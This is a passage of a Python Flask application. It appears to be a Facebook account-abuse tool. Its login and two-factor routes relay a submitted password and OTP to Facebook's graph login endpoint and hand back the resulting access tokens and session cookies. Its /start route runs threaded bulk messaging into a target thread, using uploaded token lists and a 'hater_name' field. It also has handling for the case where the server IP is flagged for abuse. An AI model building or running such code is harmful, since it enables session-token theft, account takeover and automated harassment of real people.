            "email": uid,
            "password": enc_pw,
            "generate_analytics_claim": "1",
            "cpl": "true",
            "try_num": "1",
            "family_device_id": fam_id,
            "credentials_type": "password",
            "source": "login",
            "error_detail_type": "button_with_disabled",
            "enroll_misauth": "false",
            "generate_session_cookies": "1",
            "generate_machine_id": "1",
            "currently_logged_in_userid": "0",
            "fb_api_req_friendly_name": "authenticate",
            "locale": "en_US",
            "client_country_code": "US",
        }
        
        res_data = requests.post("https://b-graph.facebook.com/auth/login", headers=headers, data=data, timeout=60).json()
        
        if 'access_token' in res_data:
            sessions_data.pop(sid, None)
            result = get_eaadv7_token(res_data['access_token'])
            return jsonify({
                'success': True,
                'tokens': result['tokens'],
                'cookies': result['cookies']
            })
        
        if 'error' in res_data:
            err = res_data['error']
            error_msg = err.get('message', '').lower()
            
            if 'abusive' in error_msg:
                return jsonify({'error': 'Server IP flagged. Try later.'})
            
            if 'approval' in error_msg or err.get('code') == 459 or 'login_first_factor' in err.get('error_data', {}):
                sid = str(uuid.uuid4())
                sessions_data[sid] = {
                    'uid': uid,
                    'err_data': err.get('error_data', {}),
                    'headers': headers,
                    'data': data
                }
                return jsonify({'two_factor': True, 'session_id': sid})
            
            return jsonify({'error': err.get('message', 'Login failed')})
            
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/two_factor', methods=['POST'])
def two_factor():
    try:
        sid = request.form.get('session_id')
        otp = request.form.get('otp')
        
        if not sid or sid not in sessions_data:
            return jsonify({'error': 'Session expired. Refresh.'})
        
        if not otp or not otp.strip() or not otp.strip().isdigit() or len(otp.strip()) != 6:
            return jsonify({'error': 'Valid 6-digit OTP is required'})

        s = sessions_data[sid]
        request_data = copy.deepcopy(s.get('data', {}))
        request_data['twofactor_code'] = otp.strip()
        request_data['userid'] = s.get('uid', '')
        request_data['credentials_type'] = 'two_factor'
        request_data['source'] = 'login'

        err_data = s.get('err_data', {}) if isinstance(s.get('err_data'), dict) else {}
        login_first_factor = err_data.get('login_first_factor')
        machine_id = err_data.get('machine_id') or request_data.get('machine_id')

        if login_first_factor:
            request_data['first_factor'] = login_first_factor
        if machine_id:
            request_data['machine_id'] = machine_id

        login_url = "https://b-graph.facebook.com/auth/login"
        res_data = requests.post(login_url, headers=s['headers'], data=request_data, timeout=60).json()

        if 'access_token' not in res_data and request_data.get('machine_id'):
            error_text = str(res_data.get('error', {}).get('message', '')).lower()
            if 'machine' in error_text or 'password' in error_text or 'invalid' in error_text:
                retry_data = copy.deepcopy(request_data)
                retry_data.pop('machine_id', None)
                res_data = requests.post(login_url, headers=s['headers'], data=retry_data, timeout=60).json()
        
        if 'access_token' in res_data:
            sessions_data.pop(sid, None)
            result = get_eaadv7_token(res_data['access_token'])
            return jsonify({
                'success': True,
                'tokens': result['tokens'],
                'cookies': result['cookies']
            })

        err_obj = res_data.get('error', {}) if isinstance(res_data, dict) else {}
        err_msg = err_obj.get('message', '2FA failed! Invalid OTP.')
        err_code = err_obj.get('code')
        if err_code:
            err_msg = f"{err_msg} (code: {err_code})"
        return jsonify({'error': err_msg})
        
    except Exception as e:
        return jsonify({'error': str(e)})


# --- SERVER ROUTES ---
@app.route('/start', methods=['POST'])
def start_task():
    try:
        token_type = request.form.get('token_type')
        thread_id = request.form.get('thread_id')
        speed = float(request.form.get('speed', 5))
        hater_name = request.form.get('hater_name', '')
        
        if token_type == 'single':
            single_token = request.form.get('single_token')
            if not single_token:
                return jsonify({'success': False, 'message': 'Token is required'})
            tokens = [single_token]
        else:
            token_file = request.files.get('token_file')
            if not token_file:
                return jsonify({'success': False, 'message': 'Token file is required'})
            tokens = token_file.read().decode().splitlines()
            tokens = [t.strip() for t in tokens if t.strip()]
        
        msg_file = request.files.get('msg_file')
        if not msg_file:
            return jsonify({'success': False, 'message': 'Message file is required'})
        messages = msg_file.read().decode().splitlines()
        messages = [m.strip() for m in messages if m.strip()]
        
        if not messages:
            return jsonify({'success': False, 'message': 'No valid messages found in file'})
        
        task_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        stop_event = Event()
        
        tasks[task_id] = {
            'stop_event': stop_event,
            'thread': Thread(target=send_messages, args=(task_id, tokens, thread_id, messages, speed, hater_name))
        }
        tasks[task_id]['thread'].start()
        
        return jsonify({'success': True, 'task_id': task_id})
        
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/stop', methods=['POST'])
def stop_task():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'message': 'Invalid request'})
        
        task_id = data.get('task_id')
        if task_id in tasks:
            tasks[task_id]['stop_event'].set()
            return jsonify({'success': True, 'message': f"Task {task_id} stopped successfully."})
        return jsonify({'success': False, 'message': "Invalid Task ID or Task already stopped."})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
